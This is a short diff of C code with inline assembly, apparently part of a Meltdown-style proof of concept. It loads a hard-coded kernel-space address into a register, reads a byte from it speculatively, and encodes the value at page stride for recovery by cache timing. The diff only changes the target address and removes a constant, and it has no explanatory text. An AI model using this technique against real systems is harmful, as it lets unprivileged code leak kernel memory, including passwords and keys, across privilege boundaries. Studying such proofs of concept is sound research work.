@@ -5,7 +5,6 @@
 
 #define PAGE_SIZE (4096)
 #define CYCLES_CACHE_HIT 100
-#define WANTED_VALUE 40
 
 static jmp_buf context;
 
@@ -42,7 +41,7 @@ int main() {
 
         // FIXME: asm volatile ("" : : "b"(array+PAGE_SIZE));
         asm volatile ("" : : "b"(array));
-        asm volatile ("movq $0xffffffff844001a0, %rcx");
+        asm volatile ("" : : "c"(0xffffffff81601448));
         asm volatile ("xorq %rax, %rax");
         asm volatile ("movb (%rcx), %al");
         asm volatile ("shlq $0xc, %rax");
